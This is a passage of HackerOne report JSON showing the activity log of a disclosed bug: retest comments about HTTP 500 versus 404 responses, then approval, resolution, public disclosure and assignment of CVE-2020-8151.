BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026X-Amz-Signature=b036b66b2ab3c4c6abdad27e8e40ab6cbd8fdf56cb0c1c3776b1479fdc9e63c2"}],"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7942286,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @x3n0nn3p - thanks for the retest! Did you also happen to retest it with an authenticated session? The cURL command doesn't indicate that you did. We also expect a 404 to be returned, not a 500. Please let us know. Thanks!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/x3n0nn3p\"\u003e@x3n0nn3p\u003c/a\u003e - thanks for the retest! Did you also happen to retest it with an authenticated session? The cURL command doesn\u0026#39;t indicate that you did. We also expect a 404 to be returned, not a 500. Please let us know. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-08T21:42:25.344Z","updated_at":"2020-05-08T21:42:25.344Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7943493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, @jobert I tried with the cookie and auth token (along with Origin and referrer) but got the same 500.\nThanks, that's all I could test. :D","markdown_message":"\u003cp\u003eHi, \u003ca href=\"/jobert\"\u003e@jobert\u003c/a\u003e I tried with the cookie and auth token (along with Origin and referrer) but got the same 500.\u003cbr\u003e\nThanks, that\u0026#39;s all I could test. :D\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-09T03:21:43.008Z","updated_at":"2020-05-09T03:21:43.008Z","actor":{"username":"x3n0nn3p","cleared":false,"url":"/x3n0nn3p","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/168/e092ba1282471c02588431d484fb4d0da1be4de9_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7965801,"is_internal":false,"editable":false,"type":"Activities::ReportRetestApproved","message":"Looks verified!","markdown_message":"\u003cp\u003eLooks verified!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-11T17:45:07.610Z","updated_at":"2020-09-11T11:07:46.681Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"genius_execution_id":null,"team_handle":"security","report_retest_user":{"user":{"username":"x3n0nn3p"},"report_retest":{"retest_subscription":{"tag":"new","triage":false,"awarding_retesters":true}}},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7965802,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-11T17:45:07.800Z","updated_at":"2020-05-11T17:45:07.800Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7965832,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-11T17:48:44.891Z","updated_at":"2020-05-11T17:48:44.891Z","first_to_agree":true,"actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7965870,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"This report was assigned [CVE-2020-8151](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8151). The report that was submitted to @rails will be publicly available soon at #803922.","markdown_message":"\u003cp\u003eThis report was assigned \u003ca href=\"/redirect?url=https%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2020-8151\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCVE-2020-8151\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The report that was submitted to @rails will be publicly available soon at \u003ca href=\"/reports/803922\"\u003e#803922\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-11T17:53:33.880Z","updated_at":"2020-05-11T17:53:33.880Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7965871,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-11T17:53:34.166Z","updated_at":"2020-05-11T17:53:34.166Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7966285,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-11T18:37:22.376Z","updated_at":"2020-05-11T18:37:22.376Z","cve_ids":["CVE-2020-8151"],"actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}